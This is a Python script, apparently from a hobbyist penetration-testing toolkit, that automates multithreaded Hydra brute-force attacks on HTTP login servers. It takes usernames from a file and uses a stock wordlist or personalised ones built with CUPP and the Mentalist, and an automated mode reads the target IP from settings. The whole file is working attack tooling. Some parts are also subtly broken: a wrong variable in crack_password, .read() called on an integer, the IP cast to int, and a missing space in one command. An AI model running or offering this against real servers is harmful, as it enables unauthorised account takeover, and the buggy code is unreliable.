import os
import subprocess
import threading
import time
import shutil
import sys


# -------------------------------------Thread definition----------------------------------------------------------------

class myThread(threading.Thread):  # thread definition updated in python 3.0
    def __init__(self, threadID, threadName, name, ip):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.threadName = threadName
        self.name = name
        self.ip = ip

    def run(self):
        print("Starting " + self.threadName)
        crack_password(self.threadName, self.name, self.ip)
        print("Exiting " + self.threadName)


# ----------------------------------------------------------------------------------------------------------------------

# ---------------------------------------------Methodes------------------------------------------------------------------

def crack_password(threadName, name, ip):  # scan def for threads to run
    print(threadName + " works")
    stream = os.system("hydra -l " + name + " -o Results/PasswordCracker/" + x +
                      " -P Resources/passwordCrack/fullcustomhoppenbrouwerslist500.txt -t 2 " + ip + " http-get -m / -V") # using hydra to crack passwords
    print(stream.read())

# ----------------------------------------------------------------------------------------------------------------------

approvedstart = False
automated = False
correct = False
answered = False
name = ""
Filename = ""
f = open("Resources/passwordCrack/Usernames")  # get ip adresses from file
threads = []
threadnumber = 1
f1 = f.readlines()

if(sys.argv[1] == "1"):
    automated = True

if not automated:
    print("Welcome to the PassCracker!")
    ipToCrack = input("What is the ip of the login server that we will be cracking?: ")
    print("Make sure the username list is filled in the Resources folder.")
    while not correct:
        cracktype = input(
            "do you want to use the standard cracklist(fast) or individualized passwords? (standard/special): ").lower()
        if cracktype == "standard" or cracktype == "special":
            correct = True
    print("Check if you put the usernames in the specific file!")
    start = input("are you ready? (yes/no)")
    start = start.lower()

    if start == "yes":
        approvedstart = True

    if approvedstart:
        for x in f1:
            if cracktype == "standard": # standard wordlist so nothing extra needed
                while threading.activeCount() > 10:  # dont go above 10 threads at the same time
                    print("max threads achived, waiting for space")
                    time.sleep(10)
                thread = myThread(1, "Thread-" + str(threadnumber), x, ipToCrack)  # creating thread
                thread.start()
                threads.append(thread)  # add to pool
                threadnumber += 1
            elif cracktype == "special": # creation of special wordlists ahead
                os.system("python3 Resources/externalScripts/cupp/cupp.py -i") # cupp custom wordlist creator
                name = input("input name from .txt file please: ")
                shutil.copy(name + ".txt", 'Resources/passwordCrack/') # copy to the right folder
                if os.path.exists(name + ".txt"):
                    os.remove(name +".txt")
                print("cause of gui reasons there is a problem running the mentalist to enhance the password list automatically")
                print("the mentalist increases chances of succes but takes longer and takes some extra steps")
                while not answered:
                    answer = input("do you want to run the mentalist? (yes/no): ").lower()
                    if answer == "yes": # opening the mentalist gui
                        answered = True
                        print("with the mentalist you will want to first delete the english dictionary")
                        print("you can do this by pressing the - on the left side of the english dictionary")
                        print("after deleting this you will want to press the + button on the right of base words")
                        print("select custom file from the list that will pop up and select the created list from")
                        print("the made list from before. you can find this list in DownloadLocation/Resources/passwordCrack/" + name)
                        print("After this is added click on the + icon at the top right and select the following: case and append")
                        print("on the right of case click the + icon and select both options in lowercase and both options in uppercase")
                        print("on the right of append click the + icon and hover over numbers and click Small 0 - 100")
                        print("after these settings press process full wordlist and place it in the passwordCrack folder")
                        input("press enter after reading")
                        subprocess.run("mentalist", shell=True)  # run the mentalist with shell
                        Filename = input("input the name of the file without the .txt: ")
                        if os.path.exists(Filename + ".txt"): # cupp created the wordlist and is ready to be used, checking if wrong location
                            print("You forgot to save it in the right location, automatic fixing...")
                            shutil.copy(Filename + ".txt", 'Resources/passwordCrack/')
                            os.remove(Filename + ".txt")
                    elif answer == "no":
                        answered = True
                        Filename = name
                stream = os.system("hydra -l " + x + "-P Resources/passwordCrack/" + Filename + ".txt -t 6 " + ipToCrack) # hydra cracking, needs to be individual with wordlists
            else:
                print("Error!")

if automated:
    settingsfull = open("Resources/fullAutomated/automationSettings")
    settings = settingsfull.readlines()
    for setting in settings:
        if setting[0] != "#":
            if setting.__contains__("ipForHacking="):
                ipToCrack = int(setting.split("=")[1])
    for x in f1:
        while threading.activeCount() > 10:  # dont go above 10 threads at the same time
            print("max threads achived, waiting for space")
            time.sleep(10)
        thread = myThread(1, "Thread-" + str(threadnumber), x, ipToCrack)  # creating thread
        thread.start()
        threads.append(thread)  # add to pool
        threadnumber += 1


f.close()
f1.clear()